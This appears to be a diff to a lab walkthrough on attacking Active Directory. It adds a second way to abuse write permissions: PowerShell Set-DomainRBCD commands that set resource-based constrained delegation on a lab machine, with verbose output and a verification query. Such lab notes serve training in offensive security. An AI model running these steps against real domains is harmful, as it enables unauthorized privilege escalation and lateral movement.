@@ -34,7 +34,7 @@ IdentityReferenceClass  : user
 ```
 
 ## Abuse the write permissions
-
+Option1:
 ```
 PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-DomainRBCD -Verbose -Identity dcorp-mgmt -DelegateFrom DCORP-STD162$
 PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-DomainRBCD -Verbose
@@ -53,6 +53,35 @@ DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-5182
 DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
 DelegatedDistinguishedName : CN=DCORP-STD162,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
 ```
+Option2:
+```
+PS C:\Windows\system32> Set-DomainRBCD -Verbose -Identity dcorp-mgmt -DelegateFrom DCORP-STD162$
+VERBOSE: [Get-DomainSearcher] search base:
+LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
+VERBOSE: [Set-DomainRBCD] Appending DelegateFilter:
+(|(|(samAccountName=DCORP-STD162$)(name=DCORP-STD162$)(displayname=DCORP-STD162$)))
+VERBOSE: [Set-DomainRBCD] Set-DomainRBCD filter string:
+(|(|(|(samAccountName=DCORP-STD162$)(name=DCORP-STD162$)(displayname=DCORP-STD162$))))
+VERBOSE: [Set-DomainRBCD] Appending to SDDL string:
+(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-719815819-3726368948-3917688648-5182)
+VERBOSE: [Set-DomainRBCD] Using SDDL string:
+O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-719815819-3726368948-3917688648-5182)
+VERBOSE: [Get-DomainSearcher] search base:
+LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
+VERBOSE: [Set-DomainRBCD] Set-DomainRBCD filter string:
+(|(|(|(samAccountName=DCORP-STD162$)(name=DCORP-STD162$)(displayname=DCORP-STD162$))))
+VERBOSE: [Set-DomainRBCD] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36
+0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 139 132 231 42
+180 224 27 222 72 47 131 233 62 20 0 0' for object 'DCORP-MGMT$'
+PS C:\Windows\system32> Get-ADComputer -Identity dcorp-mgmt -Properties msds-allowedtoactonbehalfofotheridentity | select -ExpandProperty msds-allowedtoactonbehalfofotheridentity
+
+Path Owner                  Access
+---- -----                  ------
+     BUILTIN\Administrators dcorp\DCORP-STD162$ Allow
+
+```
+
+
 
 Use Delegated Service for access to the target machine:
 
